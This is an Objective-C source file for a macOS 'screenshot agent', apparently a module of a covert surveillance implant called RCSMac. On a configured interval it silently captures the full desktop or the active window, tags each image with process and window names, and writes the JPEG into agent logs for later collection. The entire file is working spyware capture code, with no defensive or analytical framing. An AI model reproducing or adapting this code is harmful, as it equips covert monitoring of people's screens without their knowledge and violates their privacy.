/*
 * RCSMac - Screenshot agent
 * 
 *
 * Created by Alfredo 'revenge' Pesoli on 23/04/2009
 *  Modified by Massimo Chiodini
 *
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "RCSMAgentScreenshot.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"


static RCSMAgentScreenshot *sharedAgentScreenshot = nil;

// See SonOfGrab! http://developer.apple.com/samplecode/SonOfGrab/listing3.html

@interface RCSMAgentScreenshot (hidden)

- (NSDictionary *)getActiveWindowInformation;
- (BOOL)_grabScreenshot: (BOOL)entireDesktop;

@end

@implementation RCSMAgentScreenshot (hidden)

- (NSDictionary *)getActiveWindowInformation
{
  ProcessSerialNumber psn = { 0,0 };
  NSDictionary *activeAppInfo;
  
  OSStatus success;
  
  CFArrayRef windowsList;
  int windowPID;
  pid_t pid;
  
  NSNumber *windowID    = nil;
  NSString *processName = nil;
  NSString *windowName  = nil;
  
  // Active application on workspace
  activeAppInfo =  [[NSWorkspace sharedWorkspace] activeApplication];
  psn.highLongOfPSN = [[activeAppInfo valueForKey: @"NSApplicationProcessSerialNumberHigh"]
                       unsignedIntValue];
  psn.lowLongOfPSN  = [[activeAppInfo valueForKey: @"NSApplicationProcessSerialNumberLow"]
                       unsignedIntValue];
  
  // Get PID of the active Application(s)
  if (success = GetProcessPID(&psn, &pid) != 0)
    return nil;
  
  // Window list front to back
  windowsList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenAboveWindow,
                                           kCGNullWindowID);
  
  if (windowsList == NULL)
    return nil;
  
  for (NSMutableDictionary *entry in (NSArray *)windowsList)
    {
      windowPID = [[entry objectForKey: (id)kCGWindowOwnerPID] intValue];
      
      if (windowPID == pid)
        {
          windowID    = [NSNumber numberWithUnsignedInt:
                         [[[entry objectForKey: (id)kCGWindowNumber] retain] unsignedIntValue]];
          processName = [[entry objectForKey: (id)kCGWindowOwnerName] copy];
          windowName  = [[entry objectForKey: (id)kCGWindowName] copy];
          break;
        }
    }
  CFRelease(windowsList);
  
  if (windowPID != pid)
    return nil;
  
  NSArray *keys = [NSArray arrayWithObjects: @"windowID",
                                             @"processName",
                                             @"windowName",
                                             nil];
  NSArray *objects = [NSArray arrayWithObjects: windowID,
                                                processName,
                                                windowName,
                                                nil];
  NSDictionary *windowInfo = [[NSDictionary alloc] initWithObjects: objects
                                                           forKeys: keys];
  
  [windowID release];
  [processName release];
  [windowName release];
  
  return windowInfo;
}

- (BOOL)_grabScreenshot: (BOOL)entireDesktop
{
  screenshotAdditionalStruct *agentAdditionalHeader;
  
  CGImageRef screenShot;
  NSBitmapImageRep *bitmapRep;
  NSMutableData *imageData;
  NSString *processName;
  NSString *windowName;
  
  if (entireDesktop == YES) 
    {
      screenShot = CGWindowListCreateImage(CGRectInfinite,
                                           kCGWindowListOptionOnScreenOnly,
                                           kCGNullWindowID,
                                           kCGWindowImageDefault);
      processName = @"Desktop";
      windowName  = @"Desktop";
    } 
  else 
    {
      NSDictionary *windowInfo;
      
      //
      // Looks like it's better to wait at least a second in order to be sure
      // to get the window on the desktop in case of onProcess->Screenshot
      //
      sleep(1);
      
      if ((windowInfo = [self getActiveWindowInformation]) == nil)
        return NO;
      
      if ([[windowInfo objectForKey: @"windowID"] unsignedIntValue] == 0)
        return NO;
      
      screenShot = CGWindowListCreateImage(CGRectNull,
                                           kCGWindowListOptionIncludingWindow,
                                           [[windowInfo objectForKey: @"windowID"] unsignedIntValue],
                                           kCGWindowImageBoundsIgnoreFraming);
      
      processName = [[windowInfo objectForKey: @"processName"] retain];
      windowName  = [[windowInfo objectForKey: @"windowName"] retain];
      
      [windowInfo release];
    }
  
  if (screenShot == NULL)
    return NO;
  
  bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage: screenShot];
  NSData *tempData = [bitmapRep representationUsingType: NSJPEGFileType
                                             properties: nil];
  imageData = [NSMutableData dataWithData: tempData];
  
  //
  // Fill in the agent additional header
  //
  NSMutableData *rawAdditionalHeader = [NSMutableData dataWithLength: sizeof(screenshotAdditionalStruct) +
                                                                      [processName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding] +
                                                                      [windowName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  
  int processNameLength = [processName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  int windowNameLength  = [windowName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  agentAdditionalHeader = (screenshotAdditionalStruct *)[rawAdditionalHeader bytes];
  
  agentAdditionalHeader->version = LOG_SCREENSHOT_VERSION;
  agentAdditionalHeader->processNameLength = processNameLength;
  agentAdditionalHeader->windowNameLength  = windowNameLength;

  // Unfortunately we have to use replaceBytesInRange and mess with size
  // instead of doing a raw appendData
  [rawAdditionalHeader replaceBytesInRange: NSMakeRange(sizeof(screenshotAdditionalStruct), processNameLength)
                                 withBytes: [[processName dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
  
  [rawAdditionalHeader replaceBytesInRange: NSMakeRange(sizeof(screenshotAdditionalStruct) + processNameLength, windowNameLength)
                                 withBytes: [[windowName dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
  
#ifdef DEBUG_SCREENSHOT
  infoLog(@"additionalHeader: %@", rawAdditionalHeader);
#endif
  RCSMLogManager *logManager = [RCSMLogManager sharedInstance];
  
  BOOL success = [logManager createLog: AGENT_SCREENSHOT
                           agentHeader: rawAdditionalHeader
                             withLogID: 0];
  
  if (success == TRUE)
    {
#ifdef DEBUG_SCREENSHOT
      infoLog(@"logHeader created correctly");
#endif
      if ([logManager writeDataToLog: imageData
                            forAgent: AGENT_SCREENSHOT
                           withLogID: 0] == TRUE)
#ifdef DEBUG_SCREENSHOT
        infoLog(@"data written correctly");
#endif
      [logManager closeActiveLog: AGENT_SCREENSHOT
                       withLogID: 0];
    }
  
  [bitmapRep release];
  CGImageRelease(screenShot);
  
  [processName release];
  [windowName release];
  
  return YES;
}

@end

@implementation RCSMAgentScreenshot

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (RCSMAgentScreenshot *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedAgentScreenshot == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedAgentScreenshot;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedAgentScreenshot == nil)
      {
        sharedAgentScreenshot = [super allocWithZone: aZone];
        
        //
        // Assignment and return on first allocation
        //
        return sharedAgentScreenshot;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

- (void)start
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
#ifdef DEBUG_SCREENSHOT
  infoLog(@"Agent screenshot started");
#endif
  
  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
  //int dwTag = [[mAgentConfiguration objectForKey: @"dwTag"] intValue];
#ifdef DEBUG_SCREENSHOT
  infoLog(@"AgentConf: %@", mAgentConfiguration);
#endif
  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
         [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      screenshotStruct *screenshotRawData;
      screenshotRawData = (screenshotStruct *)[[mAgentConfiguration objectForKey: @"data"] bytes];
      
      int sleepTime = screenshotRawData->sleepTime;
      BOOL grabEntireDesktop = (screenshotRawData->grabActiveWindow == 0) 
                                  ? TRUE : FALSE;
      
      if ([self _grabScreenshot: grabEntireDesktop] == YES)
        {
#ifdef DEBUG_SCREENSHOT
          infoLog(@"Screenshotted! SPLASH");
#endif
        }
      else
        {
#ifdef DEBUG_SCREENSHOT
          errorLog(@"An error occurred while snapshotting");
#endif
        }
      
      [innerPool release];
      sleep(sleepTime);
    }
  
  if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
    {
      [mAgentConfiguration setObject: AGENT_STOPPED
                              forKey: @"status"];
    }
  
  [outerPool release];
}

- (BOOL)stop
{
  int internalCounter = 0;
  
  [mAgentConfiguration setObject: AGENT_STOP
                          forKey: @"status"];
  
  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED
         && internalCounter <= MAX_STOP_WAIT_TIME)
    {
      internalCounter++;
      sleep(1);
    }
  
  return YES;
}

- (BOOL)resume
{
  return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{
  if (aConfiguration != mAgentConfiguration)
    {
      [mAgentConfiguration release];
      mAgentConfiguration = [aConfiguration retain];
    }
}

- (NSMutableDictionary *)mAgentConfiguration
{
  return mAgentConfiguration;
}

@end